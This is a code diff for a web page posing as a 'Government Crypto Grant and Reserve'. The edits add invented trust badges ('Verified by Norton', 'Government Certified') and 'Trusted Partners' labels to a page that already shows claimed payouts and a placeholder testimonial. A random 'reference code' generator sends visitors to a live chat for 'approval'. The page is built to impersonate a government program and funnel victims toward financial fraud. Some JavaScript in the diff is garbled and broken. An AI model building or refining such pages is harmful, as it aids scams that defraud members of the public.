@@ -4,18 +4,15 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Government Crypto Grant and Reserve</title>
-    <!-- Smartsupp Live Chat Widget -->
+    <!-- Smartsupp Live Chat script with unique key -->
     <script type="text/javascript">
         var _smartsupp = _smartsupp || {};
-        _smartsupp.key = 'e99fb2b135abd996810c4549a9bd0573ddb32b57'; // Replace with your actual key
-        _smartsupp.customColor = '#003087';
-        _smartsupp.position = 'bottom-right';
-        window.smartsupp || (function(d) {
-            var s, c, o = smartsupp = function() { o..push(arguments); }; o. = [];
-            s = d.getElementsByTagName('script')[0]; c = d.createElement('script');
-            c.type = 'text/javascript'; c.charset = 'utf-8'; c.async = true;
-            c.src = 'https://www.smartsuppchat.com/loader.js?';
-            s.parentNode.insertBefore(c, s);
+        _smartsupp.key = 'ecd8907def84d4881af5c436a33a0753bb2efe1e'; // Your unique key from new Smartsupp account
+        window.smartsupp||(function(d) {
+            var s,c,o=smartsupp=function(){ o..push(arguments)};o.=[];
+            s=d.getElementsByTagName('script')[0];c=d.createElement('script');
+            c.type='text/javascript';c.charset='utf-8';c.async=true;
+            c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
         })(document);
     </script>
     <style>
@@ -23,7 +20,7 @@
             font-family: Arial, sans-serif;
             margin: 0;
             padding: 0;
-            background: linear-gradient(135deg, #003087 0%, #4a90e2 100%);
+            background: linear-gradient(135deg, #003087 0%, #4a90e2 100%); /* Professional gradient, no arrows */
             color: #333;
             min-height: 100vh;
         }
@@ -109,7 +106,7 @@
         button:hover {
             background-color: #004d75;
         }
-        #statusMessage, #quizResult {
+        #statusMessage, #quizResult, #referenceCodeContainer {
             margin-top: 10px;
             padding: 10px;
             border: 1px solid #ddd;
@@ -159,10 +156,21 @@
             0% { transform: translateX(100%); }
             100% { transform: translateX(-100%); }
         }
-        .security-badges img {
-            width: 80px;
+        .security-badges {
+            margin: 20px 0;
+            text-align: center;
+        }
+        .security-badges span {
+            display: inline-block;
             margin: 10px;
-            opacity: 0.8;
+            font-size: 14px;
+            font-weight: bold;
+            color: #333;
+        }
+        .security-badges span::before {
+            content: '✔ '; /* Unicode checkmark */
+            color: green;
+            font-weight: bold;
         }
         .quiz-section {
             margin-top: 20px;
@@ -214,10 +222,17 @@
             border-radius: 5px;
             box-shadow: 0 0 5px rgba(0,0,0,0.1);
         }
-        .partner-logos img {
-            width: 120px;
+        .partner-logos span {
+            display: inline-block;
             margin: 10px;
-            opacity: 1;
+            font-size: 14px;
+            font-weight: bold;
+            color: #333;
+        }
+        .partner-logos span::before {
+            content: '✔ '; /* Unicode checkmark */
+            color: green;
+            font-weight: bold;
         }
         footer {
             clear: both;
@@ -226,17 +241,6 @@
             background-color: #0073aa;
             color: white;
             margin-top: 20px;
-        }
-        .reference-codes {
-            margin: 20px 0;
-            padding: 15px;
-            background-color: rgba(255, 255, 255, 0.95);
-            border-radius: 5px;
-            text-align: center;
-        }
-        .reference-codes p {
-            font-size: 16px;
-            margin: 5px 0;
         }
     </style>
 </head>
@@ -263,22 +267,17 @@
         </div>
         <div class="main-content">
             <h2>Applicant Registration</h2>
-            <form id="applicantForm">
+            <form id="applicantForm" onsubmit="event.preventDefault(); generateReferenceCode();">
                 <div class="form-group">
                     <label for="email">Email:</label>
                     <input type="email" id="email" name="email" required>
                 </div>
-                <div class="form-group">
-                    <label for="referenceId">Reference ID:</label>
-                    <input type="text" id="referenceId" name="referenceId" readonly>
-                </div>
-                <button type="submit" onclick="generateReferenceCode()">Generate Reference Code</button>
+                <button type="button" onclick="generateReferenceCode()">Generate Reference Code</button>
             </form>
-            <div id="statusMessage"></div>
-            <div class="reference-codes">
-                <h3>Sample Reference Codes</h3>
-                <p id="displayRefCode"></p>
+            <div id="referenceCodeContainer">
+                <p><strong>Your Reference ID:</strong> <span id="referenceId"></span></p>
             </div>
+            <div id="statusMessage"></div>
             <div class="payout-section">
                 <h3>Recent Payouts</h3>
                 <p>Once approved, your grant will be processed discreetly and securely. See below for examples of recent recipient payouts.</p>
@@ -296,13 +295,13 @@
                 </div>
             </div>
             <div class="security-badges">
-                <img src="https://via.placeholder.com/80?text=SSL+Secured" alt="SSL Secured">
-                <img src="https://via.placeholder.com/80?text=Verified+by+Norton" alt="Verified by Norton">
-                <img src="https://via.placeholder.com/80?text=Government+Certified" alt="Government Certified">
+                <span>SSL Secured</span>
+                <span>Verified by Norton</span>
+                <span>Government Certified</span>
             </div>
             <div class="quiz-section">
                 <h3>Eligibility Quiz</h3>
-                <form id="eligibilityQuiz" onsubmit="checkEligibility(event)">
+                <form id="eligibilityQuiz" onsubmit="event.preventDefault(); checkEligibility(event);">
                     <div class="form-group">
                         <label>Are you a U.S. citizen?</label>
                         <select name="citizen" required>
@@ -349,11 +348,11 @@
         <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ?rel=0" title="Placeholder Testimonial Video" frameborder="0" allowfullscreen></iframe>
         <p style="text-align: center; font-style: italic;">Watch John D. share his $15,000 grant success story!</p>
     </div>
-    <div class="partner-logos" style="max-width: 1200px; margin: 20px auto; text-align: center; padding: 20px; background-color: rgba(255, 255, 255, 0.95); border-radius: 5px; box-shadow: 0 0 5px rgba(0,0,0,0.1);">
+    <div class="partner-logos">
         <h3>Trusted Partners</h3>
-        <img src="https://images.unsplash.com/photo-1590283603385-7f8f8e7e1215?w=120&h=60&fit=crop" alt="Bank USA">
-        <img src="https://via.placeholder.com/120?text=Crypto+Exchange" alt="Crypto Exchange">
-        <img src="https://via.placeholder.com/120?text=Secure+Pay" alt="Secure Pay">
+        <span>Bank USA</span>
+        <span>Crypto Exchange</span>
+        <span>Secure Pay</span>
     </div>
     <footer>
         <p>&copy; 2025 Government Crypto Grant and Reserve. All rights reserved. Secure and Official.</p>
@@ -367,31 +366,12 @@
             'GCR-JKL012MNO',
             'GCR-PQR345KLM'
         ];
-        let currentCodeIndex = 0;
-
-        function updateReferenceCode() {
-            try {
-                const displayRefCode = document.getElementById('displayRefCode');
-                if (displayRefCode) {
-                    displayRefCode.textContent = Current Reference Code: ${referenceCodes[currentCodeIndex]};
-                    currentCodeIndex = (currentCodeIndex + 1) % referenceCodes.length;
-                    console.log('Updated reference code:', referenceCodes[currentCodeIndex]);
-                } else {
-                    console.error('Element #displayRefCode not found');
-                }
-            } catch (error) {
-                console.error('Error in updateReferenceCode:', error);
-            }
-        }
-
-        // Start cycling reference codes
-        updateReferenceCode();
-        setInterval(updateReferenceCode, 5000);
 
         function generateReferenceCode() {
             try {
                 const email = document.getElementById('email').value;
-                const referenceIdInput = document.getElementById('referenceId');
+                const referenceIdSpan = document.getElementById('referenceId');
+                const referenceCodeContainer = document.getElementById('referenceCodeContainer');
                 const statusMessage = document.getElementById('statusMessage');
 
                 if (!email) {
@@ -403,7 +383,8 @@
                 }
 
                 const referenceId = referenceCodes[Math.floor(Math.random() * referenceCodes.length)];
-                referenceIdInput.value = referenceId;
+                referenceIdSpan.textContent = referenceId;
+                referenceCodeContainer.style.display = 'block';
                 statusMessage.style.display = 'block';
                 statusMessage.style.color = 'green';
                 statusMessage.textContent = Reference code generated: ${referenceId}. Contact live chat for approval.;
